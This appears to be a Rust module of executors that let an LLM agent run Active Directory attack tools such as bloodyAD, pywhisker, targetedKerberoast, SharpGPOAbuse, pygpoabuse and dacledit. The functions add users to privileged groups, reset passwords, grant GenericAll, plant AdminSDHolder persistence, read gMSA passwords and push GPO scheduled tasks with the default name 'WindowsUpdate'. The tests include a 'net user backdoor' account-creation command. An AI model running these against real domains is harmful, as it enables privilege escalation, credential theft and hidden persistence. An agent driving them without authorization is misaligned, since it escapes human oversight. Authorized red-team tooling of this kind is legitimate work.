//! ACL exploitation tool executors.
//!
//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
//! produced by running the corresponding CLI tool as a subprocess.

use anyhow::Result;
use serde_json::Value;

#[allow(unused_imports)]
use crate::args::optional_i64;
use crate::args::{optional_bool, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Convert a domain name to an LDAP base DN.
///
/// e.g. `"contoso.local"` -> `"DC=contoso,DC=local"`
fn domain_to_base_dn(domain: &str) -> String {
    domain
        .split('.')
        .map(|part| format!("DC={part}"))
        .collect::<Vec<_>>()
        .join(",")
}

// ---------------------------------------------------------------------------
// 1. bloodyAD — add group member
// ---------------------------------------------------------------------------

/// Add a user to a group via `bloodyAD add groupMember`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `group`, `target_user`
pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let group = required_str(args, "group")?;
    let target_user = required_str(args, "target_user")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("add")
        .arg("groupMember")
        .arg(group)
        .arg(target_user)
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 2. bloodyAD — set password
// ---------------------------------------------------------------------------

/// Set a user's password via `bloodyAD set password`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`, `new_password`
pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_user = required_str(args, "target_user")?;
    let new_password = required_str(args, "new_password")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("set")
        .arg("password")
        .arg(target_user)
        .arg(new_password)
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 3. bloodyAD — add GenericAll
// ---------------------------------------------------------------------------

/// Grant GenericAll rights via `bloodyAD add genericAll`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_dn`, `principal`
pub async fn bloodyad_add_genericall(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_dn = required_str(args, "target_dn")?;
    let principal = required_str(args, "principal")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("add")
        .arg("genericAll")
        .arg(target_dn)
        .arg(principal)
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 4. AdminSDHolder ACE addition
// ---------------------------------------------------------------------------

/// Add an ACL entry to the AdminSDHolder container via `bloodyAD add aclEntry`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `principal`
/// Optional args: `right` (default: `"FullControl"`)
pub async fn adminsd_holder_add_ace(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let principal = required_str(args, "principal")?;
    let right = optional_str(args, "right").unwrap_or("FullControl");

    let base_dn = domain_to_base_dn(domain);
    let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("add")
        .arg("aclEntry")
        .arg(&adminsd_dn)
        .arg(principal)
        .arg(right)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 5. gMSA password read via bloodyAD
// ---------------------------------------------------------------------------

/// Read a gMSA account's managed password via `bloodyAD get object`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `gmsa_account`
pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let gmsa_account = required_str(args, "gmsa_account")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg("get")
        .arg("object")
        .arg(gmsa_account)
        .arg("--attr")
        .arg("msDS-ManagedPassword")
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 6. pywhisker — Shadow Credentials
// ---------------------------------------------------------------------------

/// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_samaccountname`
/// Optional args: `action` (default: `"list"`)
pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_sam = required_str(args, "target_samaccountname")?;
    let action = optional_str(args, "action").unwrap_or("list");

    CommandBuilder::new("pywhisker")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("-p", password)
        .flag("--target", target_sam)
        .flag("--action", action)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 7. Targeted Kerberoast
// ---------------------------------------------------------------------------

/// Perform targeted Kerberoasting via `targetedKerberoast.py`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`
pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_user = required_str(args, "target_user")?;

    CommandBuilder::new("targetedKerberoast.py")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("-p", password)
        .flag("-t", target_user)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 8. SharpGPOAbuse
// ---------------------------------------------------------------------------

/// Abuse Group Policy Objects via `SharpGPOAbuse.exe` (run through mono on Linux).
///
/// Required args: `gpo_name`, `domain`, `username`, `password`, `dc_ip`, `user_to_add`
/// Optional args: `action` (default: `"AddLocalAdmin"`), `computer_target`
pub async fn sharpgpoabuse(args: &Value) -> Result<ToolOutput> {
    let gpo_name = required_str(args, "gpo_name")?;
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    // SharpGPOAbuse uses integrated auth via domain/DC — password is required
    // by the LLM schema for credential consistency but not passed to the binary.
    let _password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let user_to_add = optional_str(args, "user_to_add").unwrap_or(username);
    let action = optional_str(args, "action").unwrap_or("AddLocalAdmin");
    let computer_target = optional_str(args, "computer_target");

    let action_flag = format!("--{action}");

    CommandBuilder::new("mono")
        .arg("SharpGPOAbuse.exe")
        .arg(&action_flag)
        .flag("--UserAccount", user_to_add)
        .flag("--GPOName", gpo_name)
        .flag("--Domain", domain)
        .flag("--DomainController", dc_ip)
        .flag_opt("--ComputerTarget", computer_target)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 9. pygpoabuse — GPO immediate task
// ---------------------------------------------------------------------------

/// Create an immediate scheduled task via GPO abuse with `pygpoabuse`.
///
/// Required args: `domain`, `username`, `password`, `gpo_id`, `command`, `dc_ip`
/// Optional args: `task_name`, `force` (bool)
pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let gpo_id = required_str(args, "gpo_id")?;
    let command = required_str(args, "command")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let task_name = optional_str(args, "task_name").unwrap_or("WindowsUpdate");
    let force = optional_bool(args, "force").unwrap_or(true);

    let target = credentials::impacket_target(Some(domain), username, Some(password), domain);

    CommandBuilder::new("pygpoabuse")
        .arg(&target)
        .flag("-gpo-id", gpo_id)
        .flag("-command", command)
        .flag("-taskname", task_name)
        .flag("-dc-ip", dc_ip)
        .arg_if(force, "-f")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 10. dacledit — DACL editing
// ---------------------------------------------------------------------------

/// Edit DACLs via `dacledit.py`.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `principal`, `rights`, `target_dn`
/// Optional args: `action` (default: `"write"`)
pub async fn dacl_edit(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let principal = required_str(args, "principal")?;
    let rights = required_str(args, "rights")?;
    let target_dn = required_str(args, "target_dn")?;
    let action = optional_str(args, "action").unwrap_or("write");

    let target = credentials::impacket_target(Some(domain), username, Some(password), domain);

    CommandBuilder::new("dacledit.py")
        .flag("-action", action)
        .flag("-principal", principal)
        .flag("-rights", rights)
        .flag("-target-dn", target_dn)
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::args::{optional_bool, optional_str, required_str};
    use serde_json::json;

    // ── domain_to_base_dn ──────────────────────────────────────────────

    #[test]
    fn test_domain_to_base_dn_simple() {
        assert_eq!(domain_to_base_dn("contoso.local"), "DC=contoso,DC=local");
    }

    #[test]
    fn test_domain_to_base_dn_nested() {
        assert_eq!(
            domain_to_base_dn("north.contoso.local"),
            "DC=north,DC=contoso,DC=local"
        );
    }

    #[test]
    fn test_domain_to_base_dn_single() {
        assert_eq!(domain_to_base_dn("local"), "DC=local");
    }

    #[test]
    fn test_domain_to_base_dn_fabrikam() {
        assert_eq!(domain_to_base_dn("fabrikam.local"), "DC=fabrikam,DC=local");
    }

    #[test]
    fn test_domain_to_base_dn_deep_nesting() {
        assert_eq!(
            domain_to_base_dn("sub.child.contoso.local"),
            "DC=sub,DC=child,DC=contoso,DC=local"
        );
    }

    #[test]
    fn test_adminsd_holder_dn_format() {
        let domain = "contoso.local";
        let base_dn = domain_to_base_dn(domain);
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert_eq!(adminsd_dn, "CN=AdminSDHolder,CN=System,DC=contoso,DC=local");
    }

    #[test]
    fn test_adminsd_holder_dn_fabrikam() {
        let base_dn = domain_to_base_dn("fabrikam.local");
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert_eq!(
            adminsd_dn,
            "CN=AdminSDHolder,CN=System,DC=fabrikam,DC=local"
        );
    }

    // ── bloodyad_add_group_member arg validation ───────────────────────

    #[test]
    fn test_bloodyad_add_group_member_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "group": "Domain Admins",
            "target_user": "jsmith"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn test_bloodyad_add_group_member_all_args_parse() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "group": "Domain Admins",
            "target_user": "jsmith"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(required_str(&args, "username").unwrap(), "admin");
        assert_eq!(required_str(&args, "password").unwrap(), "P@ssw0rd!");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert_eq!(required_str(&args, "group").unwrap(), "Domain Admins");
        assert_eq!(required_str(&args, "target_user").unwrap(), "jsmith");
    }

    // ── bloodyad_set_password arg validation ───────────────────────────

    #[test]
    fn test_bloodyad_set_password_missing_new_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_user": "victim"
        });
        assert!(required_str(&args, "new_password").is_err());
    }

    #[test]
    fn test_bloodyad_set_password_all_args_parse() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_user": "victim",
            "new_password": "NewP@ss123!"
        });
        assert_eq!(required_str(&args, "target_user").unwrap(), "victim");
        assert_eq!(required_str(&args, "new_password").unwrap(), "NewP@ss123!");
    }

    // ── bloodyad_add_genericall arg validation ─────────────────────────

    #[test]
    fn test_bloodyad_genericall_missing_target_dn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith"
        });
        assert!(required_str(&args, "target_dn").is_err());
    }

    #[test]
    fn test_bloodyad_genericall_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_dn": "CN=Users,DC=contoso,DC=local",
            "principal": "jsmith"
        });
        assert_eq!(
            required_str(&args, "target_dn").unwrap(),
            "CN=Users,DC=contoso,DC=local"
        );
        assert_eq!(required_str(&args, "principal").unwrap(), "jsmith");
    }

    // ── adminsd_holder_add_ace arg validation ──────────────────────────

    #[test]
    fn test_adminsd_holder_right_default() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith"
        });
        let right = optional_str(&args, "right").unwrap_or("FullControl");
        assert_eq!(right, "FullControl");
    }

    #[test]
    fn test_adminsd_holder_custom_right() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "right": "WriteProperty"
        });
        let right = optional_str(&args, "right").unwrap_or("FullControl");
        assert_eq!(right, "WriteProperty");
    }

    #[test]
    fn test_adminsd_holder_dn_construction() {
        let domain = "contoso.local";
        let base_dn = domain_to_base_dn(domain);
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert!(adminsd_dn.starts_with("CN=AdminSDHolder,CN=System,DC="));
        assert!(adminsd_dn.ends_with("DC=local"));
    }

    // ── gmsa_read_password arg validation ──────────────────────────────

    #[test]
    fn test_gmsa_read_password_missing_account() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "gmsa_account").is_err());
    }

    #[test]
    fn test_gmsa_read_password_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "gmsa_account": "svc_web$"
        });
        assert_eq!(required_str(&args, "gmsa_account").unwrap(), "svc_web$");
    }

    // ── pywhisker arg validation ───────────────────────────────────────

    #[test]
    fn test_pywhisker_default_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$"
        });
        let action = optional_str(&args, "action").unwrap_or("list");
        assert_eq!(action, "list");
    }

    #[test]
    fn test_pywhisker_custom_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$",
            "action": "add"
        });
        let action = optional_str(&args, "action").unwrap_or("list");
        assert_eq!(action, "add");
    }

    #[test]
    fn test_pywhisker_missing_target_sam() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target_samaccountname").is_err());
    }

    // ── targeted_kerberoast arg validation ─────────────────────────────

    #[test]
    fn test_targeted_kerberoast_missing_target_user() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target_user").is_err());
    }

    #[test]
    fn test_targeted_kerberoast_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_user": "svc_sql"
        });
        assert_eq!(required_str(&args, "target_user").unwrap(), "svc_sql");
    }

    // ── sharpgpoabuse arg validation ───────────────────────────────────

    #[test]
    fn test_sharpgpoabuse_default_action() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let action = optional_str(&args, "action").unwrap_or("AddLocalAdmin");
        assert_eq!(action, "AddLocalAdmin");
        let action_flag = format!("--{action}");
        assert_eq!(action_flag, "--AddLocalAdmin");
    }

    #[test]
    fn test_sharpgpoabuse_user_to_add_default_fallback() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let user_to_add = optional_str(&args, "user_to_add").unwrap_or(username);
        assert_eq!(user_to_add, "admin");
    }

    #[test]
    fn test_sharpgpoabuse_explicit_user_to_add() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "user_to_add": "jsmith"
        });
        let username = required_str(&args, "username").unwrap();
        let user_to_add = optional_str(&args, "user_to_add").unwrap_or(username);
        assert_eq!(user_to_add, "jsmith");
    }

    #[test]
    fn test_sharpgpoabuse_computer_target_optional() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "computer_target": "ws01.contoso.local"
        });
        assert_eq!(
            optional_str(&args, "computer_target"),
            Some("ws01.contoso.local")
        );
    }

    #[test]
    fn test_sharpgpoabuse_computer_target_absent() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "computer_target").is_none());
    }

    // ── pygpoabuse_immediate_task arg validation ───────────────────────

    #[test]
    fn test_pygpoabuse_default_taskname() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "gpo_id": "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "command": "net user backdoor P@ssw0rd! /add",
            "dc_ip": "192.168.58.10"
        });
        let task_name = optional_str(&args, "task_name").unwrap_or("WindowsUpdate");
        assert_eq!(task_name, "WindowsUpdate");
    }

    #[test]
    fn test_pygpoabuse_default_force() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "gpo_id": "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "command": "whoami",
            "dc_ip": "192.168.58.10"
        });
        let force = optional_bool(&args, "force").unwrap_or(true);
        assert!(force);
    }

    #[test]
    fn test_pygpoabuse_force_false() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "gpo_id": "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "command": "whoami",
            "dc_ip": "192.168.58.10",
            "force": false
        });
        let force = optional_bool(&args, "force").unwrap_or(true);
        assert!(!force);
    }

    #[test]
    fn test_pygpoabuse_missing_gpo_id() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "command": "whoami",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "gpo_id").is_err());
    }

    // ── dacl_edit arg validation ───────────────────────────────────────

    #[test]
    fn test_dacl_edit_default_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "rights": "FullControl",
            "target_dn": "CN=Users,DC=contoso,DC=local"
        });
        let action = optional_str(&args, "action").unwrap_or("write");
        assert_eq!(action, "write");
    }

    #[test]
    fn test_dacl_edit_custom_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "rights": "FullControl",
            "target_dn": "CN=Users,DC=contoso,DC=local",
            "action": "restore"
        });
        let action = optional_str(&args, "action").unwrap_or("write");
        assert_eq!(action, "restore");
    }

    #[test]
    fn test_dacl_edit_missing_rights() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "target_dn": "CN=Users,DC=contoso,DC=local"
        });
        assert!(required_str(&args, "rights").is_err());
    }

    #[test]
    fn test_dacl_edit_missing_principal() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "rights": "FullControl",
            "target_dn": "CN=Users,DC=contoso,DC=local"
        });
        assert!(required_str(&args, "principal").is_err());
    }

    // ── credential helper integration ──────────────────────────────────

    #[test]
    fn test_bloodyad_creds_format() {
        let creds =
            credentials::bloodyad_creds("contoso.local", "admin", "P@ssw0rd!", "192.168.58.10");
        assert_eq!(
            creds,
            vec![
                "-d",
                "contoso.local",
                "-u",
                "admin",
                "-p",
                "P@ssw0rd!",
                "--host",
                "192.168.58.10"
            ]
        );
    }

    #[test]
    fn test_impacket_target_with_domain_and_password() {
        let target = credentials::impacket_target(
            Some("contoso.local"),
            "admin",
            Some("P@ssw0rd!"),
            "contoso.local",
        );
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!@contoso.local");
    }

    #[test]
    fn test_impacket_target_without_password() {
        let target =
            credentials::impacket_target(Some("contoso.local"), "admin", None, "contoso.local");
        assert_eq!(target, "contoso.local/admin@contoso.local");
    }

    #[test]
    fn test_impacket_target_without_domain() {
        let target =
            credentials::impacket_target(None, "admin", Some("P@ssw0rd!"), "192.168.58.10");
        assert_eq!(target, "admin:P@ssw0rd!@192.168.58.10");
    }
}
